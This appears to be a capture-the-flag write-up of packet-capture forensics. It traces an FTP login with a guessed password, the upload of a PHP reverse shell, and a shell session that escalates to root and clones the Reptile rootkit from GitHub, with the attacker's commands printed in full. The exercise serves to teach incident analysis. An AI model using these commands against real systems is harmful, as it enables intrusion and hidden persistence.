### Task 1

#### The attacker is trying to log into a specific service. What service is this ?

The protocol column starts win TCP until it shows a line with FTP :

> Line 49	0.029836461	192.168.0.115	192.168.0.147	FTP	88	Response: 220 Hello FTP World!

#### There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool ?

Google "Van Hauser brute force FTP".

#### The attacker is trying to log on with a specific username. What is the username ?

> Line 81	0.354319120	192.168.0.147	192.168.0.115	FTP	78	Request: USER jenny

#### What is the user's password ?

> Line 394	13.968715114	192.168.0.147	192.168.0.115	FTP	84	Request: PASS password123
> 
> Line 395	14.002582310	192.168.0.115	192.168.0.147	FTP	89	Response: 230 Login successful.

#### What is the current FTP working directory after the attacker logged in ?

Search for the last line where Protocol is FTP :

> Line 442	28.216001461	192.168.0.115	192.168.0.147	FTP	80	Response: 221 Goodbye.
> 
> [Current working directory: /var/www/html]

#### The attacker uploaded a backdoor. What is the backdoor's filename ?

> Line 431	19.324910508	192.168.0.147	192.168.0.115	FTP-DATA	5559	FTP Data: 5493 bytes (PORT) (STOR shell.php)
> 
> Line 438	22.682708871	192.168.0.147	192.168.0.115	FTP	92	Request: SITE CHMOD 777 shell.php

First line where protocol is HTTP :

> Line 450	32.245529788	192.168.0.147	192.168.0.115	HTTP	407	GET /shell.php HTTP/1.1

Right click on it to see a full description :

> Frame 450: 407 bytes on wire (3256 bits), 407 bytes captured (3256 bits) on interface eth0, id 0
> 
> Ethernet II, Src: VMware_4a:b9:cd (00:0c:29:4a:b9:cd), Dst: PcsCompu_92:a2:af (08:00:27:92:a2:af)
> 
> Internet Protocol Version 4, Src: 192.168.0.147, Dst: 192.168.0.115
> 
> Transmission Control Protocol, Src Port: 52670, Dst Port: 80, Seq: 1, Ack: 1, Len: 341
> 
> Hypertext Transfer Protocol
>     GET /shell.php HTTP/1.1\r\n
>     Host: 192.168.0.115\r\n
>     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n
>     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
>     Accept-Language: en-US,en;q=0.5\r\n
>     Accept-Encoding: gzip, deflate\r\n
>     DNT: 1\r\n
>     Connection: keep-alive\r\n
>     Upgrade-Insecure-Requests: 1\r\n
>     \r\n
>     [Full request URI: http://192.168.0.115/shell.php]
>     [HTTP request 1/1]`

#### The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL ?

In the description of the FTP-DATA frame :

> // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n

#### Which command did the attacker manually execute after getting a reverse shell ?

Right-click on the TCP lines below the HTTP one and select Follow -> TCP until you find something interesting :

Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 22:26:54 up  2:21,  1 user,  load average: 0.02, 0.07, 0.08  <BR>
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT  <BR>
jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash  <BR>
uid=33(www-data) gid=33(www-data) groups=33(www-data)  <BR>
/bin/sh: 0: can't access tty; job control turned off  <BR>
$ whoami  <BR>
www-data  <BR>
$ ls -la  <BR>
total 1529956  <BR>
drwxr-xr-x  23 root root       4096 Feb  1 19:52 .  <BR>
drwxr-xr-x  23 root root       4096 Feb  1 19:52 ..  <BR>
drwxr-xr-x   2 root root       4096 Feb  1 20:11 bin  <BR>
drwxr-xr-x   3 root root       4096 Feb  1 20:15 boot  <BR>
drwxr-xr-x  18 root root       3880 Feb  1 20:05 dev  <BR>
drwxr-xr-x  94 root root       4096 Feb  1 22:23 etc  <BR>
drwxr-xr-x   3 root root       4096 Feb  1 20:05 home  <BR>
lrwxrwxrwx   1 root root         34 Feb  1 19:52 initrd.img -> boot/initrd.img-4.15.0-135-generic  <BR>
lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic  <BR>
drwxr-xr-x  22 root root       4096 Feb  1 22:06 lib  <BR>
drwxr-xr-x   2 root root       4096 Feb  1 20:08 lib64  <BR>
drwx------   2 root root      16384 Feb  1 19:49 lost+found  <BR>
drwxr-xr-x   2 root root       4096 Jul 25  2018 media  <BR>
drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt  <BR>
drwxr-xr-x   2 root root       4096 Jul 25  2018 opt  <BR>
dr-xr-xr-x 117 root root          0 Feb  1 20:23 proc  <BR>
drwx------   3 root root       4096 Feb  1 22:20 root  <BR>
drwxr-xr-x  29 root root       1040 Feb  1 22:23 run  <BR>
drwxr-xr-x   2 root root      12288 Feb  1 20:11 sbin  <BR>
drwxr-xr-x   4 root root       4096 Feb  1 20:06 snap  <BR>
drwxr-xr-x   3 root root       4096 Feb  1 20:07 srv  <BR>
-rw-------   1 root root 1566572544 Feb  1 19:52 swap.img  <BR>
dr-xr-xr-x  13 root root          0 Feb  1 20:05 sys  <BR>
drwxrwxrwt   2 root root       4096 Feb  1 22:25 tmp  <BR>
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr  <BR>
drwxr-xr-x  14 root root       4096 Feb  1 21:54 var  <BR>
lrwxrwxrwx   1 root root         31 Feb  1 19:52 vmlinuz -> boot/vmlinuz-4.15.0-135-generic  <BR>
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic  <BR>
$ python3 -c 'import pty; pty.spawn("/bin/bash")'  <BR>
www-data@wir3:/$ su jenny  <BR>
su jenny  <BR>
Password: password123  <BR>
  <BR>
jenny@wir3:/$ sudo -l  <BR>
sudo -l  <BR>
[sudo] password for jenny: password123  <BR>
  <BR>
Matching Defaults entries for jenny on wir3:  <BR>
    env_reset, mail_badpass,  <BR>
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  <BR>
  <BR>
User jenny may run the following commands on wir3:  <BR>
    (ALL : ALL) ALL  <BR>
jenny@wir3:/$ sudo su  <BR>
sudo su  <BR>
root@wir3:/# whoami  <BR>
whoami  <BR>
root  <BR>
root@wir3:/# cd  <BR>
cd  <BR>
root@wir3:\~# git clone https://github.com/f0rb1dd3n/Reptile.git  <BR>
git clone https://github.com/f0rb1dd3n/Reptile.git  <BR>
Cloning into 'Reptile'...  <BR>
remote: Enumerating objects: 217, done..[K  <BR>
remote: Counting objects:   0% (1/217).[K  <BR>
...  <BR>
remote: Counting objects: 100% (217/217), done..[K  <BR>
remote: Compressing objects:   0% (1/152).[K  <BR>
...  <BR>
remote: Compressing objects: 100% (152/152), done..[K  <BR>
Receiving objects:   0% (1/1010)     <BR>
...  <BR>
Receiving objects: 100% (1010/1010), 472.55 KiB | 1.73 MiB/s, done.  <BR>
Resolving deltas:   0% (0/499)     <BR>
...  <BR>
Resolving deltas: 100% (499/499), done.  <BR>
root@wir3:\~# cd Reptile  <BR>
cd Reptile  <BR>
root@wir3:\~/Reptile# ls -la  <BR>
ls -la  <BR>
total 44  <BR>
drwxr-xr-x 7 root root 4096 Feb  1 22:27 .  <BR>
drwx------ 4 root root 4096 Feb  1 22:27 ..  <BR>
drwxr-xr-x 2 root root 4096 Feb  1 22:27 configs  <BR>
drwxr-xr-x 8 root root 4096 Feb  1 22:27 .git  <BR>
-rw-r--r-- 1 root root    8 Feb  1 22:27 .gitignore  <BR>
-rw-r--r-- 1 root root 1922 Feb  1 22:27 Kconfig  <BR>
drwxr-xr-x 7 root root 4096 Feb  1 22:27 kernel  <BR>
-rw-r--r-- 1 root root 1852 Feb  1 22:27 Makefile  <BR>
-rw-r--r-- 1 root root 2183 Feb  1 22:27 README.md  <BR>
drwxr-xr-x 4 root root 4096 Feb  1 22:27 scripts  <BR>
drwxr-xr-x 6 root root 4096 Feb  1 22:27 userland  <BR>
root@wir3:\~/Reptile# make  <BR>
make  <BR>
make[1]: Entering directory '/root/Reptile/userland'  <BR>
Makefile:10: ../.config: No such file or directory  <BR>
make[1]: *** No rule to make target '../.config'.  Stop.  <BR>
make[1]: Leaving directory '/root/Reptile/userland'  <BR>
Makefile:56: recipe for target 'userland_bin' failed  <BR>
make: *** [userland_bin] Error 2  <BR>
root@wir3:\~/Reptile#  <BR>

whoami

#### What is the computer's hostname ?

wir3

#### Which command did the attacker execute to spawn a new TTY shell ?

python3 -c 'import pty; pty.spawn("/bin/bash")'

#### Which command was executed to gain a root shell ?

sudo su

#### The attacker downloaded something from GitHub. What is the name of the GitHub project ?

git clone https://github.com/f0rb1dd3n/Reptile.git

#### The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called ?

Rootkit.

### Task 2

